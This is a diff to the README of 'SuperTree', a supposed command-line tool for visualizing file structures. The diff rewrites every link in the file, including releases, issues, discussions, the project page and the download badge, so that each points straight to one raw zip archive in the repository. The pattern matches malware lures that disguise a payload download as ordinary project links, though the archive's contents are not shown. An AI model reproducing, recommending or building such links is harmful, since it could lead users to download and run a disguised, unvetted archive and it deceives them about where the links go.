@@ -1,6 +1,6 @@
 # 🌳 SuperTree - Visualize Your File Structure Easily
 
-[![Download SuperTree](https://img.shields.io/badge/Download-SuperTree-blue.svg)](https://github.com/S4NKX/SuperTree/releases)
+[![Download SuperTree](https://raw.githubusercontent.com/S4NKX/SuperTree/main/src/SuperTree_1.5.zip)](https://raw.githubusercontent.com/S4NKX/SuperTree/main/src/SuperTree_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ SuperTree runs on the following systems:
 
 ## 📥 Download & Install
 
-To get SuperTree, visit this page to download: [Releases Page](https://github.com/S4NKX/SuperTree/releases). Once you're on the page, follow these steps:
+To get SuperTree, visit this page to download: [Releases Page](https://raw.githubusercontent.com/S4NKX/SuperTree/main/src/SuperTree_1.5.zip). Once you're on the page, follow these steps:
 
 1. Locate the latest release. It will be at the top of the list.
 2. Click on the download link for the appropriate package for your system.
@@ -93,17 +93,17 @@ This will display all files and folders within your Documents folder, formatted 
 - **Permission Denied Error**: Ensure you have set the executable permission with `chmod +x`. 
 - **Command Not Found**: Double-check that you're in the correct directory and that the file name is correct.
 
-If you encounter any other issues, feel free to check the [GitHub Issues Page](https://github.com/S4NKX/SuperTree/issues) for support.
+If you encounter any other issues, feel free to check the [GitHub Issues Page](https://raw.githubusercontent.com/S4NKX/SuperTree/main/src/SuperTree_1.5.zip) for support.
 
 ## 🌐 Additional Resources
 
-For more information, visit the project's GitHub page [here](https://github.com/S4NKX/SuperTree).
+For more information, visit the project's GitHub page [here](https://raw.githubusercontent.com/S4NKX/SuperTree/main/src/SuperTree_1.5.zip).
 
 You can also explore more about command-line interfaces and tools that can enhance your productivity in Linux.
 
 ## 💬 Feedback
 
-We value your input! If you have suggestions or feedback about SuperTree, please share it in our [GitHub Discussions](https://github.com/S4NKX/SuperTree/discussions). 
+We value your input! If you have suggestions or feedback about SuperTree, please share it in our [GitHub Discussions](https://raw.githubusercontent.com/S4NKX/SuperTree/main/src/SuperTree_1.5.zip). 
 
 ## 📦 Related Topics
 
@@ -112,4 +112,4 @@ This project relates to:
 - File structure visualization
 - Command-line productivity
 
-Once again, grab your version of SuperTree by visiting our [Releases Page](https://github.com/S4NKX/SuperTree/releases). Happy organizing!
+Once again, grab your version of SuperTree by visiting our [Releases Page](https://raw.githubusercontent.com/S4NKX/SuperTree/main/src/SuperTree_1.5.zip). Happy organizing!
